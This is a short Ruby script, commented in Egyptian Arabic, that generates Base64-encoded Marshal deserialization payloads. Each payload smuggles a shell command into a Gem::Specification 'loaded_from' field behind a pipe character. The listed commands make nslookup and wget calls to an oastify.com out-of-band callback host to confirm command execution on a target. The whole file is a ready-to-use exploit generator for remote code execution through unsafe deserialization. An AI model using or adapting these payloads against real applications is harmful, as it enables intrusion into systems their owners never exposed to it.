require 'base64'

# الميثود دي بتاخد أي كوماند وتعمله Marshal + Base64
def generate_payload(cmd)
  payload = Marshal.dump(
    Gem::Specification.new.tap do |spec|
      spec.loaded_from = "|#{cmd}"
    end
  )
  Base64.strict_encode64(payload)
end

# الكوماندات اللي عايز تشفرها
commands = [
  "nslookup ds9et2jjqdoddnjwlrvyftlhf8lz9rxg.oastify.com",
  "wget -qO- http://ds9et2jjqdoddnjwlrvyftlhf8lz9rxg.oastify.com/x"
]

# اطبع الـ payloads
commands.each do |cmd|
  puts "[*] Command: #{cmd}"
  puts "Payload (Base64): #{generate_payload(cmd)}"
  puts
end

